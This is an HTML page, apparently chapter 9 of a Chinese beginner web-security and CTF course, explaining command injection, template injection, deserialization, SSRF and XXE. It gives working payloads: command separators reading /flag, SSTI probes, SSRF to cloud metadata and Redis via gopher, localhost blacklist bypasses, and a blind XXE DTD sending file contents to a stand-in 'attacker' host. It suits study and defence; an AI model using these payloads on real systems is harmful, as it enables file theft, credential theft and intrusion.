@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>执行类与借刀类：命令、模板、反序列化、SSRF、XXE · 从零学网安</title><link rel="stylesheet" href="assets/style.css"><style>.top .btn.bk{color:#e7b98a;border-color:rgba(231,185,138,.55);margin-right:6px;text-decoration:none}.top .btn.bk:hover{color:#fff;border-color:#ff8b6b}</style></head><body><div class="top"><a class="btn bk" href="#" id="bg5fnhBack" title="回到网站">← 返回</a><div class="brand">从零学网安 <small>从 Linux 与网站运行原理，到用妮露工具箱做出一道题</small></div><div class="grow"></div><input id="q" type="search" placeholder="搜：SQL 注入 / session / 端口 …"><a class="btn" href="index.html">目录</a><div id="hits"></div></div><div class="wrap"><aside class='side'><h4>章节</h4><a href='ch00.html'>00　学习地图：这门课到底在教你什么</a><a href='ch01.html'>01　一次访问的全过程（从按下回车到看见页面）</a><a href='ch02.html'>02　Linux 最小必要：文件、权限、进程、命令</a><a href='ch03.html'>03　网站是怎么跑起来的（Nginx 与后端的分工）</a><a href='ch04.html'>04　读得懂代码：PHP / Python / JS 的最小语法对照</a><a href='ch05.html'>05　输入从哪来：参数、头、Cookie、文件、JSON</a><a href='ch06.html'>06　数据库与 SQL 注入：数据变成语法的瞬间</a><a href='ch07.html'>07　认证与会话：我是谁，以及我怎么证明</a><a href='ch08.html'>08　文件类漏洞：读取、包含、上传、穿越</a><a class='on' href='ch09.html'>09　执行类与借刀类：命令、模板、反序列化、SSRF、XXE</a><a href='ch10.html'>10　信息收集：把「一个网址」变成「一张清单」</a><a href='ch11.html'>11　用妮露工具箱实战：面板、洪水、信息显示</a><a href='ch12.html'>12　十二道渐进练习：从「看页面」到「打完整链」</a><a href='ch13.html'>13　进阶：代理层、协议层与「看不见的」漏洞</a><a href='ch14.html'>14　附录：工具箱全表（面板 · 策略 · 判据）</a><h4>附录</h4><a href='glossary.html'>术语总表</a><h4>本页</h4><a href='#s1'>先给一张总表</a><a href='#s2'>SSTI：模板引擎把输入当成了模板</a><a href='#s3'>反序列化：字符串里的对象会被真的构造</a><a href='#s4'>SSRF：借服务器的手</a><a href='#s5'>XXE：XML 的外部实体</a><a href='#s6'>怎么减少误判（这一节很重要）</a><a href='#s7'>本章小结</a></aside><main>
+<h1>第 09 章　执行类与借刀类：命令、模板、反序列化、SSRF、XXE</h1><p class='lead'>这一章是「数据变代码」的五种高级形态。共同点：服务器替你执行了你写的东西，或者替你发起了请求。</p>
+<div class="goals"><h4>本章你会得到</h4>
+<ul>
+<li>五种<a class='gl' data-k='40' href='glossary.html#t-40' title='点一下看解释（Esc 关闭）'>漏洞</a>的"一句话本质"与最小验证 payload</li>
+<li>知道它们的<a class='gl' data-k='69' href='glossary.html#t-69' title='点一下看解释（Esc 关闭）'>判据</a>为什么比别的更严格（容易<a class='gl' data-k='70' href='glossary.html#t-70' title='点一下看解释（Esc 关闭）'>假阳性</a>）</li>
+<li>每种的常见过滤与绕法各一条</li>
+</ul></div>
+
+<h2 id='s1'>先给一张总表</h2>
+
+<table>
+<tr><th><a class='gl' data-k='40' href='glossary.html#t-40' title='点一下看解释（Esc 关闭）'>漏洞</a></th><th>本质（一句话）</th><th>最小验证</th><th>拿到什么</th></tr>
+<tr><td><a class='gl' data-k='55' href='glossary.html#t-55' title='点一下看解释（Esc 关闭）'>命令注入</a></td><td>参数拼进 shell 命令</td><td><code>;id</code> → <code>uid=…</code></td><td>执行系统命令</td></tr>
+<tr><td><a class='gl' data-k='56' href='glossary.html#t-56' title='点一下看解释（Esc 关闭）'>SSTI</a>（模板注入）</td><td>参数被当成模板代码</td><td><code>{{7*7}}</code> → 49</td><td>执行代码/读文件</td></tr>
+<tr><td><a class='gl' data-k='36' href='glossary.html#t-36' title='点一下看解释（Esc 关闭）'>反序列化</a></td><td>可控字符串被还原成对象</td><td>改 cookie 后触发报错/行为变化</td><td>走 <a class='gl' data-k='37' href='glossary.html#t-37' title='点一下看解释（Esc 关闭）'>POP 链</a>到命令执行</td></tr>
+<tr><td><a class='gl' data-k='57' href='glossary.html#t-57' title='点一下看解释（Esc 关闭）'>SSRF</a></td><td>服务器替你去请求</td><td><code>url=http://127.0.0.1:80</code> 返回内网内容</td><td>访问内网/云元数据</td></tr>
+<tr><td><a class='gl' data-k='58' href='glossary.html#t-58' title='点一下看解释（Esc 关闭）'>XXE</a></td><td>XML 实体指向外部资源</td><td>读 <code>file:///etc/passwd</code></td><td>读文件/发请求</td></tr>
+</table>
+
+<figure><svg viewBox="0 0 940 290" xmlns="http://www.w3.org/2000/svg" role="img"><text x="470.0" y="28.0" fill="#ffd9a8" font-size="14.0" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="700" text-anchor="middle" opacity="1.00"><a class='gl' data-k='55' href='glossary.html#t-55' title='点一下看解释（Esc 关闭）'>命令注入</a>：把参数拼进 shell 命令</text><rect x="30.0" y="56.0" width="420.0" height="84.0" rx="10" fill="#1b1514" stroke="#3a2a2a" stroke-width="1.4" opacity="1.00"/><text x="46.0" y="80.0" fill="#ffe9cf" font-size="12.0" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="700" text-anchor="start" opacity="1.00">代码：</text><text x="46.0" y="104.0" fill="#9fd8b4" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">system('ping -c 1 ' . $_GET['ip']);</text><rect x="490.0" y="56.0" width="420.0" height="84.0" rx="10" fill="#241b19" stroke="#5a3a3e" stroke-width="1.4" opacity="1.00"/><text x="506.0" y="80.0" fill="#ff9a8f" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">输入 ip=127.0.0.1;cat /flag</text><text x="506.0" y="108.0" fill="#c9b6b2" font-size="12.0" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">→ shell 看到两条命令：ping …；cat /flag</text><text x="470.0" y="172.0" fill="#c9b6b2" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">分隔符不止分号：|  ||  &amp;&amp;  反引号  $()  换行 都是「一条命令结束、另一条开始」</text><rect x="30.0" y="196.0" width="880.0" height="70.0" rx="10" fill="#1b1514" stroke="#3a2a2a" stroke-width="1.4" opacity="1.00"/><text x="44.0" y="220.0" fill="#ffce7a" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="700" text-anchor="start" opacity="1.00">同理：</text><text x="110.0" y="220.0" fill="#c9b6b2" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00"><a class='gl' data-k='44' href='glossary.html#t-44' title='点一下看解释（Esc 关闭）'>SQL 注入</a> = 拼进 SQL；<a class='gl' data-k='56' href='glossary.html#t-56' title='点一下看解释（Esc 关闭）'>SSTI</a> = 拼进模板；LDAP / XPath 注入 = 拼进查询语言；</text><text x="110.0" y="246.0" fill="#c9b6b2" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">它们全是一个病：用户输入越过了「数据」的边界，被解释器当成了语法。</text></svg><figcaption>图 9-1　命令注入：shell 才是那个解释器</figcaption></figure>
+
+<h2 id='s2'>SSTI：模板引擎把输入当成了模板</h2>
+
+<p>模板引擎的存在是为了"把数据和页面分开"。安全用法是"数据只是数据"；
+一旦把用户输入当模板去渲染，用户就能写表达式。</p>
+
+<pre class="term"><code>// 危险写法
+render_template_string("Hello " + name)     // Flask/Jinja2
+$smarty->display('string:' . $_GET['t'])    // Smarty
+
+// 探测顺序（不同引擎语法不同）
+{{7*7}}         → Jinja2/Twig：49
+${7*7}        → 部分引擎（需转义写）
+#{7*7}        → Thymeleaf
+<%= 7*7 %>      → ERB/EJS</code></pre>
+
+<div class="why"><span class="t">为什么要先"算出 49"再找 RCE</span>
+<p>因为 49 证明"表达式被执行了"，这是<b>可计算、不可伪造</b>的证据。
+拿到这个之后再接 <code>os.popen</code>/<code>subprocess</code> 才不会白打 —— 也避免把"页面回显了 7*7 这串字符"误判成漏洞。</p></div>
+
+<h2 id='s3'>反序列化：字符串里的对象会被真的构造</h2>
+
+<figure><svg viewBox="0 0 960 290" xmlns="http://www.w3.org/2000/svg" role="img"><text x="480.0" y="28.0" fill="#ffd9a8" font-size="14.0" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="700" text-anchor="middle" opacity="1.00"><a class='gl' data-k='35' href='glossary.html#t-35' title='点一下看解释（Esc 关闭）'>序列化</a> = 把对象存成字符串；<a class='gl' data-k='36' href='glossary.html#t-36' title='点一下看解释（Esc 关闭）'>反序列化</a> = 把字符串还原成对象</text><rect x="30.0" y="60.0" width="230.0" height="76.0" rx="10" fill="#23322b" stroke="#4fa87a" stroke-width="1.4" opacity="1.00"/><text x="145.0" y="96.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">程序里的对象</text><text x="145.0" y="112.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">User{name, is_admin}</text><rect x="300.0" y="60.0" width="250.0" height="76.0" rx="10" fill="#3a2a1f" stroke="#e0a03a" stroke-width="1.4" opacity="1.00"/><text x="425.0" y="96.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00"><a class='gl' data-k='35' href='glossary.html#t-35' title='点一下看解释（Esc 关闭）'>序列化</a>字符串</text><text x="425.0" y="112.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">O:4:"User":2:{...}</text><rect x="590.0" y="60.0" width="240.0" height="76.0" rx="10" fill="#243040" stroke="#4f86c6" stroke-width="1.4" opacity="1.00"/><text x="710.0" y="96.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">存 cookie / 文件 / 缓存</text><text x="710.0" y="112.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">下次请求带回来</text><g><line x1="260.0" y1="98.0" x2="291.0" y2="98.0" stroke="#4fa87a" stroke-width="1.8"/><polygon points="298.0,98.0 291.9,101.5 291.9,94.5" fill="#4fa87a"/></g><g><line x1="550.0" y1="98.0" x2="581.0" y2="98.0" stroke="#e0a03a" stroke-width="1.8"/><polygon points="588.0,98.0 581.9,101.5 581.9,94.5" fill="#e0a03a"/></g><rect x="170.0" y="176.0" width="300.0" height="66.0" rx="10" fill="#3a2020" stroke="#d8504f" stroke-width="1.4" opacity="1.00"/><text x="320.0" y="207.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">攻击者改写这段字符串</text><text x="320.0" y="223.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">换成别的类 + 别的属性</text><g><line x1="320.0" y1="136.0" x2="320.0" y2="167.0" stroke="#d8504f" stroke-width="1.8"/><polygon points="320.0,174.0 316.5,167.9 323.5,167.9" fill="#d8504f"/></g><text x="500.0" y="200.0" fill="#c9b6b2" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">→ 服务器 unserialize 时，会自动调用</text><text x="500.0" y="222.0" fill="#c9b6b2" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">__wakeup / __destruct 等<a class='gl' data-k='34' href='glossary.html#t-34' title='点一下看解释（Esc 关闭）'>魔术方法</a>，</text><text x="500.0" y="244.0" fill="#c9b6b2" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">对象图串起来就能一路走到「读文件 / 执行命令」</text></svg><figcaption>图 8-1　反序列化：字符串里的对象图会被真的构造出来</figcaption></figure>
+
+<pre class="term"><code>// PHP：把用户可控的字符串反序列化
+$u = unserialize(base64_decode($_COOKIE['user']));
+// 攻击者构造：O:4:"User":2:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;}
+// 服务器还原对象时可能自动触发 __wakeup / __destruct → 进入 POP 链</code></pre>
+
+<div class="warn"><span class="t">为什么反序列化题"看起来很难"</span>
+<p>因为它不是"一个 payload"，而是<b>一条链</b>：入口对象 → 属性指向下一个对象 → 一直连到危险<a class='gl' data-k='32' href='glossary.html#t-32' title='点一下看解释（Esc 关闭）'>函数</a>。
+你要做的是读源码，把这条链画出来（工具里的 <code>pop_chain</code> / <code>deser</code> 策略做的就是这个）。
+不同语言格式完全不同：PHP 是 <code>O:4:"User"</code>，Java 是二进制流（<code>aced0005</code> 开头），
+Python 是 pickle，Ruby 是 Marshal —— 互相不能套用。</p></div>
+
+<h2 id='s4'>SSRF：借服务器的手</h2>
+
+<figure><svg viewBox="0 0 940 260" xmlns="http://www.w3.org/2000/svg" role="img"><text x="470.0" y="28.0" fill="#ffd9a8" font-size="14.0" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="700" text-anchor="middle" opacity="1.00"><a class='gl' data-k='57' href='glossary.html#t-57' title='点一下看解释（Esc 关闭）'>SSRF</a>：让服务器替你去访问它自己才够得着的地方</text><rect x="30.0" y="60.0" width="170.0" height="70.0" rx="10" fill="#3a2020" stroke="#d8504f" stroke-width="1.4" opacity="1.00"/><text x="115.0" y="93.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">攻击者</text><text x="115.0" y="109.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">够不到内网</text><rect x="240.0" y="60.0" width="200.0" height="70.0" rx="10" fill="#3a2a1f" stroke="#e0a03a" stroke-width="1.4" opacity="1.00"/><text x="340.0" y="93.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">有洞的应用</text><text x="340.0" y="109.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">url=参数</text><rect x="480.0" y="30.0" width="200.0" height="60.0" rx="10" fill="#243040" stroke="#4f86c6" stroke-width="1.4" opacity="1.00"/><text x="580.0" y="58.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">127.0.0.1:6379</text><text x="580.0" y="74.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">Redis（未授权）</text><rect x="480.0" y="108.0" width="200.0" height="60.0" rx="10" fill="#243040" stroke="#4f86c6" stroke-width="1.4" opacity="1.00"/><text x="580.0" y="136.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">169.254.169.254</text><text x="580.0" y="152.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">云元数据（拿密钥）</text><rect x="720.0" y="60.0" width="190.0" height="70.0" rx="10" fill="#2d2438" stroke="#9a6bb5" stroke-width="1.4" opacity="1.00"/><text x="815.0" y="93.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">内网后台</text><text x="815.0" y="109.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">只有服务器能访问</text><g><line x1="200.0" y1="95.0" x2="231.0" y2="95.0" stroke="#d8504f" stroke-width="1.8"/><polygon points="238.0,95.0 231.9,98.5 231.9,91.5" fill="#d8504f"/></g><g><line x1="440.0" y1="88.0" x2="472.2" y2="66.0" stroke="#4f86c6" stroke-width="1.8"/><polygon points="478.0,62.0 475.0,68.3 471.0,62.5" fill="#4f86c6"/></g><g><line x1="440.0" y1="100.0" x2="472.9" y2="131.2" stroke="#4f86c6" stroke-width="1.8"/><polygon points="478.0,136.0 471.2,134.4 476.0,129.3" fill="#4f86c6"/></g><g><line x1="680.0" y1="95.0" x2="711.0" y2="95.0" stroke="#9a6bb5" stroke-width="1.8"/><polygon points="718.0,95.0 711.9,98.5 711.9,91.5" fill="#9a6bb5"/></g><rect x="30.0" y="186.0" width="880.0" height="56.0" rx="10" fill="#1b1514" stroke="#3a2a2a" stroke-width="1.4" opacity="1.00"/><text x="44.0" y="208.0" fill="#ffce7a" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="700" text-anchor="start" opacity="1.00">关键：</text><text x="96.0" y="208.0" fill="#c9b6b2" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">黑名单挡「127.0.0.1」很容易绕过（十进制/八进制/IPv6/302 跳转/域名解析到 127）；</text><text x="96.0" y="230.0" fill="#c9b6b2" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">真正危险的是「能到哪」，不是「写了什么字符串」。</text></svg><figcaption>图 9-1　SSRF：借服务器的手，打它身后那张网</figcaption></figure>
+
+<table>
+<tr><th>目标</th><th>URL 形态</th><th>能得到什么</th></tr>
+<tr><td>本机服务</td><td><code>http://127.0.0.1:6379</code>（Redis）</td><td>未授权访问 → 写文件/写 cron</td></tr>
+<tr><td>云元数据</td><td><code>http://169.254.169.254/latest/meta-data/</code></td><td>临时凭证 → 接管云资源</td></tr>
+<tr><td>内网后台</td><td><code>http://10.0.0.5/admin</code></td><td>绕过"只允许内网"的限制</td></tr>
+<tr><td>gopher 打协议</td><td><code>gopher://127.0.0.1:6379/_*1%0d%0a…</code></td><td>构造任意 <a class='gl' data-k='3' href='glossary.html#t-3' title='点一下看解释（Esc 关闭）'>TCP</a> 报文（Redis/MySQL/<a class='gl' data-k='26' href='glossary.html#t-26' title='点一下看解释（Esc 关闭）'>FastCGI</a>）</td></tr>
+</table>
+
+<div class="why"><span class="t">为什么"黑名单挡 127.0.0.1"基本没用</span>
+<p>因为"127.0.0.1"有很多等价写法：<code>0177.0.0.1</code>、<code>2130706433</code>、
+<code>[::1]</code>、<code>127.1</code>、<code>localtest.me</code>（解析到 127.0.0.1），
+还可以用 302 跳转让自己的域名先被允许再跳内网。
+<b>真正的防御是白名单 + 禁止解析到内网 IP。</b></p></div>
+
+<h2 id='s5'>XXE：XML 的外部实体</h2>
+
+<figure><svg viewBox="0 0 940 285" xmlns="http://www.w3.org/2000/svg" role="img"><text x="470.0" y="28.0" fill="#ffd9a8" font-size="14.0" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="700" text-anchor="middle" opacity="1.00"><a class='gl' data-k='58' href='glossary.html#t-58' title='点一下看解释（Esc 关闭）'>XXE</a>：XML 解析器帮你把文件读出来</text><rect x="26.0" y="54.0" width="430.0" height="92.0" rx="10" fill="#1b1514" stroke="#3a2a2a" stroke-width="1.4" opacity="1.00"/><text x="40.0" y="76.0" fill="#ffe9cf" font-size="12.0" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="700" text-anchor="start" opacity="1.00">提交的 XML：</text><text x="40.0" y="100.0" fill="#ff9a8f" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">&lt;!DOCTYPE x [&lt;!ENTITY f SYSTEM 'file:///flag'&gt;]&gt;</text><text x="40.0" y="122.0" fill="#ff9a8f" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">&lt;x&gt;&amp;f;&lt;/x&gt;</text><rect x="500.0" y="54.0" width="180.0" height="60.0" rx="10" fill="#3a2a1f" stroke="#e0a03a" stroke-width="1.4" opacity="1.00"/><text x="590.0" y="82.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">XML 解析器</text><text x="590.0" y="98.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">看到 &amp;f; 就去读</text><rect x="720.0" y="54.0" width="190.0" height="60.0" rx="10" fill="#2a2a2a" stroke="#7d6f6d" stroke-width="1.4" opacity="1.00"/><text x="815.0" y="82.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">文件系统</text><text x="815.0" y="98.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">file:///flag</text><rect x="720.0" y="132.0" width="190.0" height="56.0" rx="10" fill="#2d2438" stroke="#9a6bb5" stroke-width="1.4" opacity="1.00"/><text x="815.0" y="158.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">响应</text><text x="815.0" y="174.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">实体被替换成内容</text><g><line x1="456.0" y1="100.0" x2="491.4" y2="88.2" stroke="#e0a03a" stroke-width="1.8"/><polygon points="498.0,86.0 493.4,91.2 491.1,84.6" fill="#e0a03a"/></g><g><line x1="680.0" y1="84.0" x2="711.0" y2="84.0" stroke="#7d6f6d" stroke-width="1.8"/><polygon points="718.0,84.0 711.9,87.5 711.9,80.5" fill="#7d6f6d"/></g><g><line x1="815.0" y1="112.0" x2="815.0" y2="123.0" stroke="#9a6bb5" stroke-width="1.8"/><polygon points="815.0,130.0 811.5,123.9 818.5,123.9" fill="#9a6bb5"/></g><rect x="26.0" y="168.0" width="904.0" height="100.0" rx="10" fill="#1b1514" stroke="#3a2a2a" stroke-width="1.4" opacity="1.00"/><text x="40.0" y="192.0" fill="#ffce7a" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="700" text-anchor="start" opacity="1.00">为什么它危险：</text><text x="168.0" y="192.0" fill="#c9b6b2" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">XML 的外部实体本来是「复用文档片段」的功能，但它允许指定任意 URL。</text><text x="168.0" y="216.0" fill="#c9b6b2" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">于是：能读文件、能发请求（盲打靠外部 DTD 把内容带出去）、能打内网（类似 SSRF）。</text><text x="168.0" y="240.0" fill="#c9b6b2" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">防御叫「禁用外部实体」—— 这是功能与安全的取舍，不是 bug。</text></svg><figcaption>图 9-2　XXE：实体替换把文件内容塞进了响应</figcaption></figure>
+
+<p>除了直接读文件，盲打（页面不回显）时用"外部 DTD 两段式"把内容带出来：</p>
+
+<pre class="term"><code># 第一段：让解析器去 load 我们的 DTD
+&lt;!DOCTYPE r [&lt;!ENTITY % p SYSTEM "http://attacker/evil.dtd"&gt; %p;]&gt;
+
+# evil.dtd：把文件内容拼进一个请求带出去
+&lt;!ENTITY % f SYSTEM "file:///flag"&gt;
+&lt;!ENTITY % send "&lt;!ENTITY &#37; o SYSTEM 'http://attacker/?d=%f;'&gt;"&gt;
+%send; %o;</code></pre>
+
+<h2 id='s6'>怎么减少误判（这一节很重要）</h2>
+
+<table>
+<tr><th><a class='gl' data-k='70' href='glossary.html#t-70' title='点一下看解释（Esc 关闭）'>假阳性</a>长什么样</th><th>为什么会发生</th><th>怎么排除</th></tr>
+<tr><td>页面出现 <code>49</code></td><td>页面本来就写着 49（示例/说明）</td><td>换 <code>6*7</code> 再测一次</td></tr>
+<tr><td>回显里出现 payload</td><td>服务器把输入原样反射</td><td>发不可执行怪串做对照</td></tr>
+<tr><td>SSRF "成功"</td><td>目标把我们的 URL 存进了数据库/页面</td><td>换一个不存在<a class='gl' data-k='1' href='glossary.html#t-1' title='点一下看解释（Esc 关闭）'>端口</a>，看行为是否不同</td></tr>
+<tr><td>反序列化"触发"</td><td>其实只是 cookie 解析失败的报错</td><td>改成合法序列化串对比报错差异</td></tr>
+</table>
+
+<div class="tool"><span class="t">工具箱里对应什么</span>
+<p><code>param_rce</code>/<code>cmd_filter</code>/<code>noalpha</code>（命令注入与绕过滤）、
+<code>ssti</code>/<code>tpl_dialect</code>（模板注入，含方言探测）、
+<code>deser</code>/<code>pop_chain</code>/<code>java_deser</code>/<code>pickle_rce</code>（各语言反序列化）、
+<code>ssrf</code>/<code>ssrf_gopher</code>/<code>gopher_redis</code>/<code>ssrf_cloud</code>（SSRF 系列）、
+<code>xxe</code>/<code>blind_xxe</code>（XXE 含盲打）。</p></div>
+
+<h2 id='s7'>本章小结</h2>
+
+<table>
+<tr><th>漏洞</th><th>记这一句</th></tr>
+<tr><td>命令注入</td><td>shell 是解释器，分隔符就是命令边界</td></tr>
+<tr><td>SSTI</td><td>模板引擎被当成了 eval</td></tr>
+<tr><td>反序列化</td><td>字符串里的对象图会被真的构造，<a class='gl' data-k='34' href='glossary.html#t-34' title='点一下看解释（Esc 关闭）'>魔术方法</a>自动跑</td></tr>
+<tr><td>SSRF</td><td>危险的是"能到哪"，不是"写了什么"</td></tr>
+<tr><td>XXE</td><td>实体替换是功能，不是 bug</td></tr>
+</table>
+
+<div class='pager'><a class='l' href='ch08.html'>← 08　文件类漏洞：读取、包含、上传、穿越</a><a class='r' href='ch10.html'>10　信息收集：把「一个网址」变成「一张清单」 →</a></div></main></div><script src="assets/terms.js"></script><script src="assets/site.js"></script><script>
+(function () {
+  var b = document.getElementById("bg5fnhBack");
+  if (!b) return;
+  b.addEventListener("click", function (e) {
+    e.preventDefault();
+    try {
+      if (window.parent !== window) {
+        window.parent.postMessage({ type: "BG5FNH_CLOSE_OVERLAY" }, "*");
+        return;
+      }
+    } catch (err) {}
+    var m = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent || "");
+    window.location.href = "../../../../../" + (m ? "mobile/index_m.html" : "pc/index.html");
+  });
+})();
+</script>
+</body></html>
